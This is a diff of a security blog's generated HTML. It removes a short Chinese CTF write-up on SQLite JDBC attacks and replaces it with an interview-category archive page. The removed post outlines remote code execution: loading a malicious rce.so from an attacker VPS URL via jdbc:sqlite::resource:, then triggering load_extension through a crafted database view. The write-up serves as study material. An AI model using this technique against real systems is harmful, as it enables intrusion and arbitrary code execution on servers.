@@ -9,7 +9,7 @@
     
     <title>
         
-            sqlite攻击 |
+            分类: 面试 |
         
         1diot9&#39;s Blog
     </title>
@@ -114,7 +114,7 @@
                         </li>
                     
                         
-                        <li class="menu-item flex-start border-box">
+                        <li class="menu-item flex-start border-box active">
                             <a class="menu-text-color border-box" href="/categories">
                                 
                                 分类
@@ -191,7 +191,7 @@
                 </li>
             
                 
-                <li class="drawer-menu-item border-box not-sub-menu">
+                <li class="drawer-menu-item border-box not-sub-menu active">
                     <label class="drawer-menu-label border-box">
                         <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                             
@@ -229,257 +229,40 @@
             <div class="main-content border-box">
                 
 
-                    
-<div class="fade-in-down-animation">
-    <div class="post-page-container border-box">
-        <div class="post-content-container border-box">
+                    <div class="fade-in-down-animation">
+    <div class="category-archive-container border-box">
+        <div class="category-name">
+            <i class="fas fa-folder"></i>&nbsp;面试
+        </div>
+        <div class="category-post-list">
             
-
-            <div class="post-content-bottom border-box">
+<div class="archive-list-container border-box">
+    
+        <section class="archive-item border-box">
+            <div class="archive-item-header border-box">
+                <span class="archive-year">2025</span>
+            </div>
+            <ul class="archive-item-body border-box">
                 
-                    <div class="post-title">
-                        sqlite攻击
-                    </div>
+                    <li class="post-item border-box">
+                        <span class="starting-point border-box flex-center"></span>
+                        <span class="post-date border-box">06-19</span>
+                        <a class="post-title border-box text-ellipsis"
+                           href="/2025/06/19/2025%E6%9A%91%E6%9C%9F%E9%9D%A2%E8%AF%95%E6%B1%87%E6%80%BB/"
+                        >2025暑期面试汇总</a>
+                    </li>
                 
-
-                
-                    <div class="post-header border-box">
-                        
-                            <div class="avatar-box border-box">
-                                <img src="/images/baka.png">
-                            </div>
-                        
-                        <div class="info-box">
-                            <div class="author border-box">
-                                <span class="name">1diot9</span>
-                                
-                                    <span class="author-badge">Lv3</span>
-                                
-                            </div>
-                            <div class="meta-info border-box">
-                                
-
-<div class="post-meta-info-container border-box post">
-    <div class="post-meta-info border-box">
-        
-
-        
-            <span class="meta-info-item post-create-date">
-                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-05-05 19:59:36</span>
-            </span>
-
-            
-                <span class="meta-info-item post-update-date">
-                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon May 05 2025 19:59:59 GMT+0800">2025-05-05 19:59:59</span>
-                </span>
-            
-        
-
-        
-            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
-                <ul class="post-category-ul">
-                    
-                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
-                        
-                    
-                </ul>
-            </span>
-        
-
-        
-            <span class="post-tag meta-info-item border-box">
-                <ul class="post-tag-ul">
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
-                        
-                    
-                </ul>
-            </span>
-        
-
-        
-        
-            <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>341 字</span>
-            </span>
-        
-        
-            <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
-            </span>
-        
-        
-            <span class="meta-info-item post-pv">
-                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-            </span>
-        
-    </div>
-
+            </ul>
+        </section>
     
 </div>
 
-                            </div>
-                        </div>
-                    </div>
-                
-
-                <div class="post-content keep-markdown-body ">
-                    
-
-                    
-                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>适用于load_extension打开的情况，比如：<img   src="/2025/05/03/JNI/te%E6%94%BB%E5%87%BB/image.png"  alt="img"></p>
-<p>虽然这种情况现实中比较少。</p>
-<p>第一次遇到是在ciscn24_ezjava上</p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先你需要知道，sqlite是一个内存数据库，直接存储在本地，没有server，client一说。一个sqlite数据库就是一个文件，类似test.db。你可以随机新建一个db文件，然后创建sqlite时打开，这样之后产生的数据都会写在这个db文件上。sqlite无法跟mysql一样返回反序列化数据，只能通过加载so文件实现RCE</p>
-<p>漏洞利用流程：</p>
-<p>（前提：靶机能够执行select * from xxx，xxx可控）</p>
-<p>1、在vps上创建rce.c，编译成rce.so。通过JDBC连接(jdbc:sqlite::resource:<a class="link"   target="_blank" rel="noopener" href="http://10.195.247.79:7776/rce.so)%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96vps%E4%B8%8A%E7%9A%84rce.so%EF%BC%8C%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0/tmp/sqlite-jdbc-tmp-xxxx.db%E3%80%82%E5%85%B6%E4%B8%ADxxxx%E7%9A%84%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F%E5%8F%AF%E7%9F%A5%E3%80%82" >http://10.195.247.79:7776/rce.so)，可以获取vps上的rce.so，并保存到/tmp/sqlite-jdbc-tmp-xxxx.db。其中xxxx的计算方式可知。<i class="fas fa-external-link-alt"></i></a></p>
-<p>2、新建exp.db，用navicat创建一个sqlite连接。新建一个查询，执行CREATE VIEW security as SELECT (SELECT load_extension(‘&#x2F;tmp&#x2F;sqlite-jdbc-tmp–xxxx.db’)); 这样会新建一个视图</p>
-<p>3、通过JDBC连接，可以获取vps上的exp.db，执行load_extension，加载之前的so文件，实现rce。即靶机最后执行select * from security</p>
-<p>如果能写文件的话，那就直接写so文件，然后加载就行了。最终的目的反正都是加载so文件。</p>
-
-                    
-                </div>
-
-                
-                        
-<div class="post-copyright-info-container border-box">
-    <div class="copyright-info-content border-box">
-        <div class="copyright-info-top border-box">
-            <div class="copyright-post-title border-box text-ellipsis">
-                sqlite攻击
-            </div>
-
-            <div class="copyright-post-link border-box text-ellipsis">
-                2025/05/05/sqlite攻击/
-            </div>
         </div>
-
-        <div class="copyright-info-bottom border-box">
-            <div class="copyright-post-author bottom-item">
-                <div class="type">
-                    作者
-                </div>
-                <div class="content">1diot9</div>
-            </div>
-
-            <div class="post-time bottom-item">
-                <div class="type">
-                    发布于
-                </div>
-                <div class="content">2025-05-05 19:59</div>
-            </div>
-
-
-            <div class="post-license bottom-item">
-                <div class="type">
-                    许可
-                </div>
-                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
-                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
-                        
-                            <i class="fa-brands fa-creative-commons"></i>
-                            <i class="fa-brands fa-creative-commons-by"></i>
-                            <i class="fa-brands fa-creative-commons-nc"></i>
-                            <i class="fa-brands fa-creative-commons-sa"></i>
-                        
-                    </a>
-                </div>
-            </div>
-        </div>
-
-        <i class="copyright-bg fa-solid fa-copyright"></i>
     </div>
-    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
-        <i class="fa-solid fa-copy"></i>
-    </div>
-</div>
-
-                
-
-                <div class="post-bottom-tags-and-share border-box">
-                    <div>
-                        
-                            <ul class="post-tags-box border-box">
-                                
-                                    <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
-                                    </li>
-                                
-                            </ul>
-                        
-                    </div>
-                    <div>
-                        
-                    </div>
-                </div>
-
-                
-
-                
-                    <div class="post-nav border-box">
-                        
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2025/05/05/hsql/"
-                                   title="hsql"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">hsql</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
-                        
-                            <div class="next-post">
-                                <a class="next"
-                                   rel="next"
-                                   href="/2025/05/05/mysql-JDBC-%E7%BB%95%E8%BF%87/"
-                                   title="mysql JDBC 绕过"
-                                >
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">mysql JDBC 绕过</span>
-                                        <span class="post-nav-item">下一篇</span>
-                                    </span>
-                                    <span class="right arrow-icon flex-center">
-                                        <i class="fas fa-chevron-right"></i>
-                                    </span>
-                                </a>
-                            </div>
-                        
-                    </div>
-                
-
-                
-                    
+    
 
 
 
-
-
-
-                
-            </div>
-        </div>
-
-        
-            <div class="pc-post-toc right-toc">
-                <div class="post-toc-wrap border-box">
-    <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li></ol>
-    </div>
-</div>
-
-            </div>
-        
-    </div>
 </div>
 
 
@@ -543,31 +326,6 @@
 
     <!-- post tools -->
     
-        <div class="post-tools right-toc">
-            <div class="post-tools-container border-box">
-    <ul class="post-tools-list border-box">
-        <!-- PC encrypt again -->
-        
-
-        <!-- PC TOC show toggle -->
-        
-            <li class="tools-item flex-center toggle-show-toc">
-                <i class="fas fa-list"></i>
-            </li>
-        
-
-        <!-- PC go comment -->
-        
-
-        <!-- PC full screen -->
-        <li class="tools-item flex-center full-screen">
-            <i class="fa-solid fa-expand"></i>
-        </li>
-    </ul>
-</div>
-
-        </div>
-    
 
     <!-- side tools -->
     <div class="side-tools">
@@ -598,10 +356,6 @@
     </ul>
 
     <ul class="exposed-tools-list border-box">
-        
-            <li class="tools-item toggle-show-toc-tablet flex-center">
-                <i class="fas fa-list"></i>
-            </li>
         
 
         
@@ -659,18 +413,8 @@
 
     <!-- tablet toc -->
     
-        <div class="tablet-post-toc-mask">
-            <div class="tablet-post-toc">
-                <div class="post-toc-wrap border-box">
-    <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li></ol>
-    </div>
-</div>
-
-            </div>
-        </div>
-    
 </main>
+
 
 
 
@@ -709,30 +453,12 @@
 
     <!-- post page -->
     
-        <!-- post-helper -->
-        
-<script src="/js/post/post-helper.js"></script>
-
-
-        <!-- toc -->
-        
-            
-<script src="/js/post/toc.js"></script>
-
-        
-
-        <!-- copyright-info -->
-        
-            
-<script src="/js/post/copyright-info.js"></script>
-
-        
-
-        <!-- share -->
-        
-    
 
     <!-- categories page -->
+    
+        
+<script src="/js/page/category-page.js"></script>
+
     
 
     <!-- links page -->
